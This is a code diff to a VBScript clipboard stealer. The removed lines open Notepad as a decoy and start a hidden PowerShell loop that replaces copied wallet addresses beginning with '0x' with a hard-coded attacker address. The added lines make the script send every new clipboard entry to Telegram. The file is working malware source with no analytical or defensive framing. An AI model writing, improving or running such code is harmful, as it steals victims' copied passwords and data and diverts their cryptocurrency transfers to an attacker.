@@ -60,12 +60,6 @@ Function GetClipboardText()
     If Err.Number <> 0 Then Err.Clear
 End Function
 
-' Start Notepad
-objShell.Run "notepad.exe"
-
-' Execute PowerShell command to monitor clipboard
-Set objExec = objShell.Exec("powershell -windowstyle hidden -command ""while ($true) { $clipboard = Get-Clipboard; if ($clipboard -like '0x*') { Set-Clipboard '0xA44e0E325EaE1cBD135db65ef013eFa630315278' }; Start-Sleep -Seconds 1 }""")
-
 ' Main loop to keep script running and monitor clipboard
 On Error Resume Next
 Dim lastClipboardText
@@ -73,10 +67,11 @@ Do While True
     Dim currentClipboardText
     currentClipboardText = GetClipboardText()
     
-    ' Check if content is copied to the clipboard
-    If currentClipboardText <> "" Then
-        ' Send copied content to Telegram
-        SendTelegramMessage "Copied content: " & currentClipboardText
+    ' Check if content is copied to the clipboard and is different from the last clipboard text
+    If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
+        lastClipboardText = currentClipboardText
+        ' Send the new clipboard content to Telegram
+        SendTelegramMessage "New clipboard text: " & currentClipboardText
     End If
     
     WScript.Sleep 1000 ' Check every second
